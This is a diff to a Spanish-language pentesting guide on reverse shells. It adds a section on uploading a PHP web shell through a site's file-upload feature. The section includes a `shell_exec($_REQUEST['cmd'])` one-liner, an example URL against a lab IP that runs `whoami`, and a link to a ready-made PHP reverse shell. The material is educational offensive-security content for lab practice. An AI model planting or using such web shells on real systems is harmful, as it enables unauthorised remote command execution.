@@ -15,6 +15,7 @@ Guía rápida para comprender, generar y utilizar reverse shells en entornos de 
   - [Uso de `bash -c`](#uso-de-bash--c)
   - [Envío de reverse shell a través de una URL (URL encoding)](#envío-de-reverse-shell-a-través-de-una-url-url-encoding)
 - [Recomendaciones adicionales](#recomendaciones-adicionales)
+-  [Subir reverse en PHP (si la página permite subida de archivos)](#subir_reverse)
 
 ---
 
@@ -164,7 +165,62 @@ Solo debes editar la IP y el puerto en el código antes de desplegarla.
 
 ---
 
-## 🚀 ¡Happy Hacking! 🐚
+## 📂 Subir reverse en PHP (si la página permite subida de archivos)
+
+A veces, la página nos permite subir archivos y luego acceder a ellos directamente.  
+Muchas páginas interpretan archivos PHP, por lo que podemos aprovecharlo para obtener una reverse shell o ejecutar comandos.
+
+---
+
+### 🔸 Ejemplo simple con `system`
+
+```php
+<?php
+	system('id');
+?>
+```
+
+---
+
+### 🔸 Ejemplo más flexible con `shell_exec`
+
+```php
+<?php
+	echo shell_exec($_REQUEST['cmd']);
+?>
+```
+
+Esta última opción permite ejecutar **comandos arbitrarios** pasados como parámetro `cmd` en la URL.
+
+---
+
+### 🌐 Ejemplo de uso
+
+```text
+http://172.17.0.2/<RUTA_DONDE_SE_ALOJA_EL_ARCHIVO>/<ARCHIVO_PHP>?cmd=<COMANDO>
+```
+
+Por ejemplo:
+
+```text
+http://172.17.0.2/uploads/shell.php?cmd=whoami
+```
+
+---
+
+### ⚠️ Notas importantes
+
+- No siempre se puede ejecutar directamente la reverse shell o el comando desde la propia página.
+- En ocasiones es necesario **subir el script PHP adecuado** que te permita abrir la reverse shell o ejecutar comandos como se desee.
+
+---
+
+✅ Recurso recomendado para obtener un PHP reverse shell listo:
+
+- [https://pentestmonkey.net/tools/web-shells/php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+
+---
+
 
 ---
 
